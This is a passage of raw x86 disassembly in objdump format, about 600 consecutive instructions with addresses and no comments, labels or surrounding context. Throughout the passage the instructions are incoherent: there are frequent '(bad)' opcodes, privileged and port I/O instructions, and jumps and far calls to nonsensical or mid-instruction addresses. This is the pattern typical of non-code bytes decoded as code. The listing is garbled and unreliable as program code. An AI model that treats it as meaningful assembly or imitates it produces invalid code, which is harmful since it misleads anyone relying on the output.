  4139e1:	jne    0x413a46
  4139e3:	mov    bh,0x8
  4139e5:	cmp    BYTE PTR [esi-0x5b],dh
  4139e8:	inc    ebp
  4139e9:	pop    ebx
  4139ea:	fwait
  4139eb:	int    0x22
  4139ed:	inc    ecx
  4139ee:	outs   dx,DWORD PTR ds:[esi]
  4139ef:	add    al,0xb3
  4139f1:	inc    edx
  4139f2:	xchg   edx,eax
  4139f3:	popf   
  4139f4:	sub    DWORD PTR [ebp-0x50],ecx
  4139f7:	xor    DWORD PTR [ebx+0x75169795],ebx
  4139fd:	inc    ebx
  4139fe:	ret    0x4759
  413a01:	in     al,0x6e
  413a03:	loopne 0x4139ef
  413a05:	outs   dx,DWORD PTR ds:[esi]
  413a06:	sbb    bh,BYTE PTR [esi+0x436ca211]
  413a0c:	retf   0x8e30
  413a0f:	and    edi,DWORD PTR [esi]
  413a11:	dec    eax
  413a12:	mov    ds,WORD PTR [edi+0x70]
  413a15:	(bad)  
  413a17:	or     edi,0xfffffffb
  413a1a:	(bad)  
  413a1b:	js     0x413a7f
  413a1d:	int3   
  413a1e:	outs   dx,BYTE PTR ds:[esi]
  413a1f:	mov    edi,0x92201fbe
  413a24:	xor    BYTE PTR [esi],dl
  413a26:	xor    eax,0x11385651
  413a2b:	xor    eax,0xaf6dd9d2
  413a30:	push   edx
  413a31:	jp     0x4139f2
  413a33:	adc    ah,BYTE PTR [edi+0x77]
  413a36:	outs   dx,DWORD PTR ds:[esi]
  413a37:	ins    BYTE PTR es:[edi],dx
  413a38:	push   esp
  413a39:	out    0xd2,eax
  413a3b:	mov    bh,0xf3
  413a3d:	or     BYTE PTR ds:0x86831039,ch
  413a43:	(bad)  
  413a44:	push   ebp
  413a45:	add    ebp,DWORD PTR [ebx+0x5ad6709d]
  413a4b:	pop    ecx
  413a4c:	cmc    
  413a4d:	fsubr  QWORD PTR [ebp-0x52]
  413a50:	je     0x413a65
  413a52:	aam    0xe4
  413a54:	or     edi,DWORD PTR [ebx]
  413a56:	cmp    DWORD PTR [ecx+0x314492f7],edi
  413a5c:	push   eax
  413a5d:	test   al,0x3b
  413a5f:	popa   
  413a60:	cmc    
  413a61:	inc    ebx
  413a62:	mov    gs,WORD PTR [eax+0x40]
  413a65:	jo     0x413a58
  413a67:	cmp    eax,0xc9ae3fcf
  413a6c:	stos   BYTE PTR es:[edi],al
  413a6d:	in     al,0xb7
  413a6f:	js     0x413a4f
  413a71:	rcr    edx,1
  413a73:	out    0xf5,eax
  413a75:	add    BYTE PTR [edi+0x22],0xdc
  413a79:	ds pop edi
  413a7b:	scas   eax,DWORD PTR es:[edi]
  413a7c:	repz add ah,cl
  413a7f:	xchg   edx,eax
  413a80:	dec    ecx
  413a81:	cmp    ebp,DWORD PTR [esi-0x14df5d54]
  413a87:	or     BYTE PTR [ebp+0x228dac13],dl
  413a8d:	cmp    BYTE PTR [edx+0x5f536456],bl
  413a93:	adc    cl,ch
  413a95:	cmp    BYTE PTR [edx+0x3],dl
  413a98:	dec    edx
  413a99:	push   es
  413a9a:	stos   BYTE PTR es:[edi],al
  413a9b:	push   eax
  413a9c:	scas   al,BYTE PTR es:[edi]
  413a9d:	inc    edi
  413a9e:	outs   dx,DWORD PTR ds:[esi]
  413a9f:	shl    BYTE PTR [edx-0x65],0xf6
  413aa3:	bound  edi,QWORD PTR [esi-0x7bc72aea]
  413aa9:	stos   BYTE PTR es:[edi],al
  413aaa:	cwde   
  413aab:	idiv   DWORD PTR [esi-0x30]
  413aae:	dec    esi
  413aaf:	push   edx
  413ab0:	js     0x413a7f
  413ab2:	mov    WORD PTR [eax*2+0x3e66f5c5],fs
  413ab9:	(bad)  
  413aba:	aad    0x92
  413abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413abd:	sub    ah,BYTE PTR [edx+0x22386d0e]
  413ac3:	sbb    al,0xb2
  413ac5:	sub    eax,0x5f54b281
  413aca:	outs   dx,DWORD PTR ds:[esi]
  413acb:	mov    es,WORD PTR [esi]
  413acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ace:	popf   
  413acf:	ret    0x62bc
  413ad2:	or     BYTE PTR [ecx],bh
  413ad4:	dec    edx
  413ad5:	xchg   BYTE PTR [ecx],cl
  413ad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ad8:	mov    ah,0x42
  413ada:	dec    ebp
  413adb:	scas   al,BYTE PTR es:[edi]
  413adc:	cmc    
  413add:	(bad)  
  413ade:	lods   eax,DWORD PTR ds:[esi]
  413adf:	mov    bl,0x1e
  413ae1:	sbb    DWORD PTR [edx+0x7b],ecx
  413ae4:	xchg   edx,eax
  413ae5:	cmp    ah,BYTE PTR ds:0x4fc3ddf
  413aeb:	popa   
  413aec:	sti    
  413aed:	stos   DWORD PTR es:[edi],eax
  413aee:	xchg   ebp,eax
  413aef:	repnz in al,dx
  413af1:	(bad)  
  413af2:	dec    eax
  413af3:	stos   DWORD PTR es:[edi],eax
  413af4:	or     ebp,DWORD PTR [ebx-0x11]
  413af7:	call   0x2b50b5df
  413afc:	dec    edx
  413afd:	fimul  WORD PTR [edi]
  413aff:	inc    esp
  413b00:	ss xor al,0xaf
  413b03:	push   eax
  413b04:	mov    ds:0x3e4fe22b,al
  413b09:	add    cl,ah
  413b0b:	sti    
  413b0c:	jno    0x413a92
  413b0e:	mov    edx,0x6e1ea789
  413b13:	jne    0x413b69
  413b15:	cld    
  413b16:	stc    
  413b17:	pop    es
  413b18:	cmp    dh,BYTE PTR [ecx]
  413b1a:	jnp    0x413b10
  413b1c:	ins    BYTE PTR es:[edi],dx
  413b1d:	lods   eax,DWORD PTR ds:[esi]
  413b1e:	mov    bl,0x48
  413b20:	retw   
  413b22:	cmp    dh,BYTE PTR [edi+0x4b9624f5]
  413b28:	jp     0x413b9f
  413b2a:	push   edx
  413b2b:	and    BYTE PTR [ecx-0x3e],bl
  413b2e:	xchg   ecx,eax
  413b2f:	push   esp
  413b30:	mov    al,ds:0x4797863b
  413b35:	xchg   esi,eax
  413b36:	(bad)  
  413b37:	jae    0x413b0a
  413b39:	cmp    ecx,esi
  413b3b:	sbb    eax,0x8cc6f6df
  413b40:	pop    eax
  413b41:	mov    gs,WORD PTR [esi-0xa]
  413b44:	int    0xa6
  413b46:	sti    
  413b47:	or     eax,0x258d1662
  413b4c:	adc    ebx,DWORD PTR [ecx*2-0x211df347]
  413b53:	mov    esp,0x62832536
  413b58:	or     BYTE PTR [edi+ebp*1+0x0],ch
  413b5c:	pop    ebp
  413b5d:	popa   
  413b5e:	jns    0x413b78
  413b60:	push   esp
  413b61:	cmp    BYTE PTR [edi],dh
  413b63:	dec    esi
  413b64:	xor    edx,ebp
  413b66:	dec    ebx
  413b67:	sub    al,0x2d
  413b69:	fisubr DWORD PTR [esi-0x79]
  413b6c:	sbb    al,0x31
  413b6e:	outs   dx,DWORD PTR ds:[esi]
  413b6f:	mov    esp,0x37ea4472
  413b74:	repnz fiadd DWORD PTR [ebx-0x80]
  413b78:	jne    0x413b84
  413b7a:	xchg   ebx,eax
  413b7b:	or     BYTE PTR [esi-0x69],cl
  413b7e:	in     al,dx
  413b7f:	pop    esp
  413b80:	cmc    
  413b81:	int3   
  413b82:	stos   DWORD PTR es:[edi],eax
  413b83:	mov    bl,0xac
  413b85:	addr16 dec ebp
  413b87:	rcl    DWORD PTR [eax+edi*1-0x5e],1
  413b8b:	outs   dx,BYTE PTR ds:[esi]
  413b8c:	adc    ebx,DWORD PTR [edi+0x2bb2ffd]
  413b92:	imul   edx,DWORD PTR [ebx+0x50eb3238],0x445922b7
  413b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b9d:	mov    bl,0xa6
  413b9f:	cmp    ch,dl
  413ba1:	push   ds
  413ba2:	push   ecx
  413ba3:	sub    DWORD PTR [ebx-0x1503d6ee],ecx
  413ba9:	(bad)  
  413baa:	leave  
  413bab:	in     eax,0x50
  413bad:	repnz cs loop 0x413b62
  413bb1:	fist   WORD PTR [eax-0x44c4a2bc]
  413bb7:	imul   edi,DWORD PTR [esi],0xffffffd1
  413bba:	outs   dx,DWORD PTR ds:[esi]
  413bbb:	push   edx
  413bbc:	stos   DWORD PTR es:[edi],eax
  413bbd:	stos   DWORD PTR es:[edi],eax
  413bbe:	push   es
  413bbf:	mov    esp,0xb97845f6
  413bc4:	push   ss
  413bc5:	push   cs
  413bc6:	or     esp,DWORD PTR [edi]
  413bc8:	shl    DWORD PTR [esi+0x61033968],0xbe
  413bcf:	mov    bl,BYTE PTR [esi+0x2175f470]
  413bd5:	dec    esp
  413bd6:	shl    DWORD PTR ds:0x15da67f5,1
  413bdc:	test   eax,0x87e24c3a
  413be1:	cmp    ecx,DWORD PTR [ebx-0x17]
  413be4:	pop    ecx
  413be5:	mov    ebx,0xed845f5b
  413bea:	jno    0x413b9a
  413bec:	imul   ebx,DWORD PTR [esi],0x5e
  413bef:	mov    ecx,0x1ca4b631
  413bf4:	jmp    0x1531:0xd9735938
  413bfb:	mov    ebx,DWORD PTR [ebp+eiz*1+0x253d876f]
  413c02:	lock xchg ecx,eax
  413c04:	adc    edi,esp
  413c06:	or     eax,0x6bbb634
  413c0b:	fidivr DWORD PTR [eax+edi*4-0x2a]
  413c0f:	dec    esp
  413c10:	mov    esi,0xee2b8a7b
  413c15:	stos   BYTE PTR es:[edi],al
  413c16:	and    al,0xaa
  413c18:	cmc    
  413c19:	add    eax,0xf86d256
  413c1e:	outs   dx,BYTE PTR ds:[esi]
  413c1f:	adc    eax,0x1559cdca
  413c24:	cli    
  413c25:	dec    esi
  413c26:	dec    edi
  413c27:	cmp    ecx,eax
  413c29:	jno    0x413c45
  413c2b:	int3   
  413c2c:	fisubr WORD PTR [ebx-0x5d]
  413c2f:	pop    ecx
  413c30:	cmc    
  413c31:	or     BYTE PTR [edi+0x44edd786],0xc8
  413c38:	loope  0x413c1f
  413c3a:	adc    DWORD PTR [edx+0x23bff289],ecx
  413c40:	cmp    al,0x38
  413c42:	into   
  413c43:	xor    BYTE PTR [edi-0xa7fcc02],bh
  413c49:	push   esi
  413c4a:	dec    DWORD PTR [ecx]
  413c4c:	mov    ecx,0xf057f56
  413c51:	cmp    BYTE PTR [esi],bh
  413c53:	div    esi
  413c55:	popf   
  413c56:	sub    ecx,DWORD PTR [eax-0x32]
  413c59:	pop    edx
  413c5a:	jmp    FWORD PTR [edx-0x1e95350b]
  413c60:	je     0x413c29
  413c62:	jle    0x413c28
  413c64:	pop    edx
  413c65:	cmp    BYTE PTR [edi-0x9],ch
  413c68:	shl    DWORD PTR [edx+eiz*4+0x7c],1
  413c6c:	xchg   edi,eax
  413c6d:	stos   DWORD PTR es:[edi],eax
  413c6e:	outs   dx,BYTE PTR ds:[esi]
  413c6f:	push   ss
  413c70:	cmp    ah,BYTE PTR [edi]
  413c72:	aam    0x42
  413c74:	jns    0x413c82
  413c76:	enter  0x183f,0x8a
  413c7a:	sbb    DWORD PTR [edx+0x7c],0x7c
  413c7e:	daa    
  413c7f:	xor    dl,dl
  413c81:	pop    esi
  413c82:	outs   dx,DWORD PTR ds:[esi]
  413c83:	rol    DWORD PTR [ebp+0x3c4e4fa9],cl
  413c89:	scas   eax,DWORD PTR es:[edi]
  413c8a:	lock cmp dh,ch
  413c8d:	mov    al,ds:0xeb18b4e7
  413c92:	mov    dl,0xd9
  413c94:	cmc    
  413c95:	pop    ds
  413c96:	or     BYTE PTR [edi+0x77d13002],dl
  413c9c:	gs out 0x8c,al
  413c9f:	shl    ebp,1
  413ca1:	jmp    0x898b:0x832c223b
  413ca8:	cmc    
  413ca9:	pushf  
  413caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cab:	loop   0x413c5c
  413cad:	pop    ds
  413cae:	xchg   BYTE PTR [edx+0x38fd29d5],dh
  413cb4:	jp     0x413c79
  413cb6:	cs ds or al,0xf6
  413cba:	arpl   di,ax
  413cbc:	cmc    
  413cbd:	inc    ebp
  413cbe:	jp     0x413c9a
  413cc0:	fbld   TBYTE PTR [eax-0x30]
  413cc3:	bnd jbe 0x413cfe
  413cc6:	xor    ebx,DWORD PTR [esi+0x76a525b7]
  413ccc:	xlat   BYTE PTR ds:[ebx]
  413ccd:	push   edx
  413cce:	iret   
  413ccf:	call   0x8f7a5111
  413cd4:	loope  0x413d04
  413cd6:	repnz cmp BYTE PTR [ecx-0x56],ah
  413cda:	jnp    0x413d11
  413cdc:	jae    0x413c96
  413cde:	and    ecx,DWORD PTR [esi]
  413ce0:	jecxz  0x413c7b
  413ce2:	pop    ecx
  413ce3:	outs   dx,BYTE PTR ds:[esi]
  413ce4:	ins    BYTE PTR es:[edi],dx
  413ce5:	sub    eax,0xb4b0ae6f
  413cea:	test   al,0x14
  413cec:	xchg   al,bh
  413cee:	jecxz  0x413cd2
  413cf0:	lock cmp bh,dl
  413cf3:	(bad)  
  413cf4:	stc    
  413cf5:	retf   
  413cf6:	cdq    
  413cf7:	pop    ecx
  413cf8:	pop    esp
  413cf9:	pop    eax
  413cfa:	inc    dl
  413cfc:	jo     0x413cd7
  413cfe:	outs   dx,BYTE PTR ds:[esi]
  413cff:	push   ss
  413d00:	jmp    0xb522254a
  413d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d06:	test   BYTE PTR [eax],bh
  413d08:	adc    eax,0xc5cea8e4
  413d0d:	mov    bh,0xdf
  413d0f:	xor    dh,BYTE PTR [ecx]
  413d11:	loope  0x413cad
  413d13:	cmp    DWORD PTR [ebp+0x6a],edx
  413d16:	xor    DWORD PTR [ecx],esp
  413d18:	adc    al,0x5f
  413d1a:	das    
  413d1b:	mov    eax,0x4ee230d9
  413d20:	arpl   WORD PTR [edi-0x58],cx
  413d23:	dec    eax
  413d24:	xor    ebp,eax
  413d26:	cmc    
  413d27:	jo     0x413d1e
  413d29:	adc    si,WORD PTR [ebp+0x67]
  413d2d:	popa   
  413d2e:	push   edi
  413d2f:	(bad)  
  413d30:	push   ds
  413d31:	mov    eax,ds:0xae510781
  413d36:	add    al,al
  413d38:	data16 cmp BYTE PTR [ecx+eiz*1],dh
  413d3c:	std    
  413d3d:	xlat   BYTE PTR ds:[ebx]
  413d3e:	lods   al,BYTE PTR ds:[esi]
  413d3f:	test   al,0xec
  413d41:	fidiv  DWORD PTR [edx-0x71]
  413d44:	inc    ebp
  413d45:	dec    eax
  413d46:	lahf   
  413d47:	cmp    ebx,DWORD PTR [ecx-0x1d]
  413d4a:	ret    
  413d4b:	cmp    BYTE PTR [edi],cl
  413d4d:	cmp    ah,BYTE PTR [ecx-0x4fe0ab81]
  413d53:	leave  
  413d54:	adc    ebx,DWORD PTR [edx]
  413d56:	push   ebp
  413d57:	nop
  413d58:	cmc    
  413d59:	dec    ebx
  413d5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d5b:	xrelease mov DWORD PTR [esi+ebp*8-0x17a10fc8],esp
  413d63:	fcmovb st,st(3)
  413d65:	mov    ds:0xa8ec490f,eax
  413d6a:	push   ebx
  413d6b:	inc    eax
  413d6c:	adc    ecx,DWORD PTR [edi+0x5f]
  413d6f:	jmp    0x30842e63
  413d74:	xor    ecx,DWORD PTR [ebp-0x1465deec]
  413d7a:	mov    edx,0x64819fc6
  413d7f:	div    BYTE PTR [bp-0x624c]
  413d84:	fcom   DWORD PTR [ebx+0x584467c1]
  413d8a:	and    ebx,ebp
  413d8c:	adc    DWORD PTR ds:0xd8f5828b,esp
  413d92:	xlat   BYTE PTR ds:[ebx]
  413d93:	ss inc edx
  413d95:	fnsave [ecx]
  413d97:	cmp    DWORD PTR [esi+esi*8-0x5adadc57],edx
  413d9e:	ins    BYTE PTR es:[edi],dx
  413d9f:	scas   al,BYTE PTR es:[edi]
  413da0:	cmc    
  413da1:	mov    dl,al
  413da3:	add    cl,dl
  413da5:	push   ecx
  413da6:	in     al,0xfb
  413da8:	sahf   
  413da9:	mov    ecx,0x66d138ba
  413dae:	stos   DWORD PTR es:[edi],eax
  413daf:	mov    es,esi
  413db1:	icebp  
  413db2:	pop    ebx
  413db3:	int    0xf5
  413db5:	mov    WORD PTR [esi+0x2590135f],ss
  413dbb:	xor    eax,0xfaca24e3
  413dc0:	outs   dx,DWORD PTR ds:[esi]
  413dc1:	mov    ch,cl
  413dc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413dc4:	adc    ecx,0x4a84f877
  413dca:	(bad)  
  413dcb:	(bad)  
  413dcc:	scas   al,BYTE PTR es:[edi]
  413dcd:	jnp    0x413db5
  413dcf:	out    0xf5,al
  413dd1:	add    cl,BYTE PTR [ebx+0x7d]
  413dd4:	stos   DWORD PTR es:[edi],eax
  413dd5:	or     BYTE PTR [eax+0x41],0xe0
  413dd9:	in     eax,0x99
  413ddb:	cld    
  413ddc:	jne    0x413e11
  413dde:	loope  0x413e08
  413de0:	test   al,0xb3
  413de2:	sar    BYTE PTR [ebx-0x7d0678fb],cl
  413de8:	mov    eax,0xbd3375a0
  413ded:	pop    es
  413dee:	call   0x2ae6:0x7aa82cbd
  413df5:	inc    ebp
  413df6:	loop   0x413daa
  413df8:	cmc    
  413df9:	jnp    0x413e24
  413dfb:	ins    DWORD PTR es:[edi],dx
  413dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dfd:	retf   
  413dfe:	fstp   DWORD PTR [edi-0x6d5dc7bd]
  413e04:	add    BYTE PTR [eax-0x7c7f05ad],cl
  413e0a:	js     0x413e2f
  413e0c:	adc    BYTE PTR [edi],cl
  413e0e:	outs   dx,BYTE PTR ds:[esi]
  413e0f:	adc    esp,ebx
  413e11:	stos   DWORD PTR es:[edi],eax
  413e12:	cmp    edi,eax
  413e14:	js     0x413e0a
  413e16:	push   ds
  413e17:	pop    edx
  413e18:	cmc    
  413e19:	push   eax
  413e1a:	mov    bh,0x15
  413e1c:	cmp    BYTE PTR [ebp-0x1],al
  413e1f:	xchg   esp,eax
  413e20:	cmc    
  413e21:	adc    eax,0x489e5bc0
  413e26:	mov    esi,0x1b38770d
  413e2b:	cmc    
  413e2c:	sub    dl,dl
  413e2e:	mov    ah,0x5d
  413e30:	xchg   ecx,eax
  413e31:	clc    
  413e32:	outs   dx,BYTE PTR ds:[esi]
  413e33:	xchg   esp,eax
  413e34:	sub    al,0xbc
  413e36:	xlat   BYTE PTR ds:[ebx]
  413e37:	mov    cl,0xc7
  413e39:	xor    bh,bl
  413e3b:	cmp    BYTE PTR ds:0xabcba9b0,al
  413e41:	adc    ch,ah
  413e43:	mov    edi,0xa11beae4
  413e48:	mov    ebx,edx
  413e4a:	cmp    eax,0x8ef14e36
  413e4f:	cdq    
  413e50:	and    esi,ebp
  413e52:	pop    ecx
  413e53:	push   ebp
  413e54:	cmp    BYTE PTR [ebx],0xec
  413e57:	jns    0x413e8f
  413e59:	out    dx,al
  413e5a:	pop    ebx
  413e5b:	fwait
  413e5c:	xlat   BYTE PTR ds:[ebx]
  413e5d:	cmp    ecx,DWORD PTR [esi+0x4d]
  413e60:	mov    bh,BYTE PTR [esi]
  413e62:	inc    ebp
  413e63:	mov    ?,WORD PTR [ecx]
  413e65:	int3   
  413e66:	outs   dx,BYTE PTR ds:[esi]
  413e67:	jmp    0x413e96
  413e69:	pushf  
  413e6a:	and    al,0xe3
  413e6c:	mov    ah,0xe5
  413e6e:	pop    ebp
  413e6f:	mov    al,ds:0x52758a5d
  413e74:	std    
  413e75:	in     al,0xd
  413e77:	les    edx,FWORD PTR ds:0x34a67b01
  413e7d:	cmp    BYTE PTR [edx+0x74ffed08],ah
  413e83:	push   ebp
  413e84:	(bad)  
  413e85:	fsubr  QWORD PTR [esi-0x6a]
  413e88:	inc    edx
  413e89:	mov    esi,0x9c3d503b
  413e8e:	jp     0x413ec8
  413e90:	cmp    DWORD PTR [edi],edi
  413e92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e93:	das    
  413e94:	pushf  
  413e95:	xchg   BYTE PTR [ebp-0x54],ch
  413e98:	cmc    
  413e99:	mov    ch,0x38
  413e9b:	sub    ch,al
  413e9d:	jns    0x413ec0
  413e9f:	sbb    ebx,DWORD PTR [edx]
  413ea1:	in     al,0x13
  413ea3:	(bad)  
  413ea5:	lds    eax,FWORD PTR ds:0x4c8a71bb
  413eab:	push   ss
  413eac:	call   0x300e5eb0
  413eb1:	mov    cl,0xd5
  413eb3:	push   eax
  413eb4:	enter  0x79ae,0x48
  413eb8:	stc    
  413eb9:	add    BYTE PTR [eax+0x18],cl
  413ebc:	retf   
  413ebd:	push   es
  413ebe:	or     al,0xb9
  413ec0:	mov    dh,0xe9
  413ec2:	mov    ah,bl
  413ec4:	mov    cl,0x48
  413ec6:	outs   dx,DWORD PTR ds:[esi]
  413ec7:	sub    cl,ch
  413ec9:	xchg   esp,eax
  413eca:	and    eax,0xddf19106
  413ecf:	cmp    BYTE PTR [edi],al
  413ed1:	lahf   
  413ed2:	mov    WORD PTR [ecx-0x69c3daf1],gs
  413ed8:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413eda:	outs   dx,BYTE PTR ds:[esi]
  413edb:	push   esp
  413edc:	sahf   
  413edd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ede:	mov    ecx,0x768d6040
  413ee3:	cmp    BYTE PTR [edx],ah
  413ee5:	sub    DWORD PTR [eax+0x1b],ebx
  413ee8:	shl    BYTE PTR [ebx+edi*4+0x41],0xf5
  413eed:	add    DWORD PTR [esi-0x33],ecx
  413ef0:	test   BYTE PTR [edi-0x80],0xab
  413ef4:	jb     0x413e9d
  413ef6:	cmc    
  413ef7:	xor    ecx,DWORD PTR [esi+0x16]
  413efa:	inc    esp
  413efb:	or     BYTE PTR [esi-0x29abf25],dl
  413f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f02:	outs   dx,BYTE PTR ds:[esi]
  413f03:	push   0xffffffba
  413f05:	adc    eax,0x2f1679c1
  413f0a:	aad    0xbb
  413f0c:	jnp    0x413ebb
  413f0e:	pop    ebp
  413f0f:	cmp    DWORD PTR [ebx+0x236eb8e6],edi
  413f15:	addr16 jb 0x413f8d
  413f18:	cmc    
  413f19:	push   ebx
  413f1a:	repz inc ebp
  413f1c:	push   ds
  413f1d:	cmp    al,0x1
  413f1f:	mov    al,ds:0xed3d3bbc
  413f24:	or     DWORD PTR [ebp+0x2e],eax
  413f27:	arpl   WORD PTR ds:0x95ba75f1,ax
  413f2d:	lods   al,BYTE PTR ds:[esi]
  413f2e:	or     ecx,DWORD PTR ds:0x194f85f5
  413f34:	mov    eax,ds:0x6bf2e23b
  413f39:	sbb    DWORD PTR [esi-0x80],0xd16f5e47
  413f40:	xor    al,BYTE PTR [edx-0x11da25e4]
  413f46:	mov    WORD PTR [ebx],ds
  413f48:	pop    edi
  413f49:	mov    ds:0x7c713914,al
  413f4e:	aad    0x33
  413f50:	jae    0x413f62
  413f52:	outs   dx,BYTE PTR ds:[esi]
  413f53:	lock add al,0xff
  413f56:	clts   
  413f58:	daa    
  413f59:	stc    
  413f5a:	test   DWORD PTR [eax],edi
  413f5c:	jns    0x413f6d
  413f5e:	mov    edi,0xd9d44ffa
  413f63:	mov    cl,0xf5
  413f65:	and    al,0x99
  413f67:	pop    esi
  413f68:	pop    ds
  413f69:	push   es
  413f6a:	icebp  
  413f6b:	add    bh,BYTE PTR [edx-0x2a967bc5]
  413f71:	mov    BYTE PTR [edi+0x19],dh
  413f74:	dec    ebx
  413f75:	jns    0x413fe6
  413f77:	jecxz  0x413fb1
  413f79:	xchg   ebx,eax
  413f7a:	imul   ecx,DWORD PTR [edx+0x67],0xffffffd8
  413f7e:	mov    cl,0x38
  413f80:	push   es
  413f81:	(bad)  
  413f82:	test   DWORD PTR [ebx],edi
  413f84:	cmp    dl,0x9c
  413f87:	pop    ss
  413f88:	cmc    
  413f89:	jle    0x413f37
  413f8b:	cmp    BYTE PTR ds:0x50695cb3,0x38
  413f92:	call   0x68cdc6a6
  413f97:	jae    0x413f52
  413f99:	pop    ecx
  413f9a:	outs   dx,DWORD PTR ds:[esi]
  413f9b:	ins    DWORD PTR es:[edi],dx
  413f9c:	mov    edx,0x496294e1
  413fa1:	or     al,0x4f
  413fa3:	arpl   WORD PTR ds:[edx+0x6c93327c],si
  413faa:	test   DWORD PTR [eax-0x78],0x5f6f7cb7
  413fb1:	dec    eax
  413fb2:	pop    esp
  413fb3:	outs   dx,DWORD PTR ds:[esi]
  413fb4:	int    0xf3
  413fb6:	imul   esp,ecx,0xdedde11e
  413fbc:	std    
  413fbd:	and    bl,BYTE PTR [esp+eiz*4]
  413fc0:	cmc    
  413fc1:	call   0x7cda99
  413fc6:	fsub   DWORD PTR [esi-0x30]
  413fc9:	cmp    al,0x35
  413fcb:	pop    esp
  413fcc:	or     bh,dh
  413fce:	sar    BYTE PTR [ecx-0x3b],cl
  413fd1:	pusha  
  413fd2:	xchg   ebx,eax
  413fd3:	dec    esi
  413fd4:	cmc    
  413fd5:	inc    esp
  413fd6:	add    al,0xfe
  413fd8:	mov    ch,0x11
  413fda:	sbb    cl,BYTE PTR [edi]
  413fdc:	push   cs
  413fdd:	loop   0x41401a
  413fdf:	dec    esi
  413fe0:	jne    0x413ff3
  413fe2:	push   es
  413fe3:	jg     0x414015
  413fe5:	push   DWORD PTR [edx]
  413fe7:	cmp    dh,BYTE PTR [edx+0x20]
  413fea:	outs   dx,DWORD PTR ds:[esi]
  413feb:	mov    ds:0x4e9f00f7,eax
  413ff0:	cwde   
  413ff1:	pop    es
  413ff2:	jo     0x413ff9
  413ff4:	push   ss
  413ff5:	add    dh,ch
  413ff7:	push   es
  413ff8:	or     BYTE PTR [edx+0x66],0x99
  413ffc:	imul   ebp,esp,0x2cf5092a
  414002:	mov    BYTE PTR [ebp-0x2],0x38
  414006:	xchg   ebp,eax
  414007:	mov    ch,bl
  414009:	pop    ss
  41400a:	mov    bh,bh
  41400c:	push   0x777fce5
  414011:	pop    ebx
  414012:	dec    edx
  414013:	in     al,dx
  414014:	inc    edi
  414015:	dec    ebx
  414016:	inc    edi
  414017:	sub    DWORD PTR [ecx+0x6c176eba],ebx
  41401d:	test   al,0xb3
  41401f:	ret    0x183f
  414022:	sahf   
  414023:	cmp    al,bh
  414025:	iret   
  414026:	jecxz  0x413ff7
  414028:	mul    DWORD PTR [ebx]
  41402a:	imul   ebp,ebx,0x3d
  41402d:	xchg   DWORD PTR [ecx],ebx
  41402f:	mov    ecx,0xc345c18e
  414034:	mov    dl,cl
  414036:	adc    eax,0x95388709
  41403b:	pop    esp
  41403c:	jp     0x414059
  41403e:	jne    0x4140b1
  414040:	inc    edi
  414041:	ret    0xa002
  414044:	xchg   ebx,eax
  414045:	jnp    0x414036
  414047:	pop    edx
  414048:	xor    eax,0xf0303369
  41404d:	xor    ch,bh
  41404f:	cmp    al,0xdc
  414051:	or     dl,BYTE PTR [edx+0x5423f4c6]
  414057:	push   esp
  414058:	cmc    
  414059:	fiadd  WORD PTR [edx+edx*1-0x63]
  41405d:	popf   
  41405e:	fadd   DWORD PTR [edx+0x4a]
  414061:	lods   eax,DWORD PTR ds:[esi]
  414062:	pop    es
  414063:	cmp    DWORD PTR [ebx+esi*2-0xb],esi
  414067:	or     esi,eax
  414069:	push   ss
  41406a:	in     al,dx
  41406b:	ret    
  41406c:	cmc    
  41406d:	out    dx,eax
  41406e:	cli    
  41406f:	int    0x14
  414071:	popf   
  414072:	add    edi,0xc149a1a6
  414078:	dec    esp
  414079:	loopne 0x4140b2
  41407b:	lea    esi,[esp+edx*1]
  41407e:	out    dx,al
  41407f:	or     al,0xfd
  414081:	xor    al,bh
  414083:	add    al,BYTE PTR ss:[esi]
  414086:	jne    0x4140eb
  414088:	mov    BYTE PTR [ebp+0x3a],ah
  41408b:	mov    DWORD PTR [ebp-0x9148848],esi
  414091:	cmp    al,dh
  414093:	call   DWORD PTR [ecx+ebx*8-0x6fe04bd9]
  41409a:	dec    esi
  41409b:	adc    BYTE PTR [ebp+0x51],ah
  41409e:	push   0x31ed898e
  4140a3:	les    edx,FWORD PTR [edi]
  4140a5:	mov    WORD PTR [edx+0xb],es
  4140a8:	jnp    0x414106
  4140aa:	lods   al,BYTE PTR ds:[esi]
  4140ab:	cmp    BYTE PTR [eax-0x43],dl
  4140ae:	add    bl,ch
  4140b0:	je     0x41412e
  4140b2:	cs xchg esp,eax
  4140b4:	cmc    
  4140b5:	popf   
  4140b6:	and    ebx,DWORD PTR [esi]
  4140b8:	jbe    0x414110
  4140ba:	out    0x9a,al
  4140bc:	xor    ah,al
  4140be:	lods   eax,DWORD PTR ds:[esi]
  4140bf:	lds    esi,FWORD PTR [ebp-0x54]
  4140c2:	xor    eax,0x1827aedb
  4140c7:	sbb    ebp,esi
  4140c9:	hlt    
  4140ca:	and    al,0xf2
  4140cc:	mov    es,WORD PTR [ebp-0x1c]
  4140cf:	push   ebx
  4140d0:	mov    BYTE PTR [edx],bh
  4140d2:	fs mov esi,ebx
  4140d5:	pop    esi
  4140d6:	and    ah,dh
  4140d8:	push   ebx
  4140d9:	test   eax,0x9409112e
  4140de:	dec    edi
  4140df:	inc    ebx
  4140e0:	daa    
  4140e1:	cmp    eax,0xf8e7c3b1
  4140e6:	repz out 0xd5,al
  4140e9:	cdq    
  4140ea:	shr    DWORD PTR [ecx],1
  4140ec:	cmc    
  4140ed:	and    al,0xdd
  4140ef:	jbe    0x414103
  4140f1:	mov    ah,ch
  4140f3:	add    al,0x6c
  4140f5:	cmp    edx,DWORD PTR [ecx]
  4140f7:	(bad)  
  4140f8:	hlt    
  4140f9:	(bad)
  4140fc:	leave  
  4140fd:	and    dl,dl
  4140ff:	inc    eax
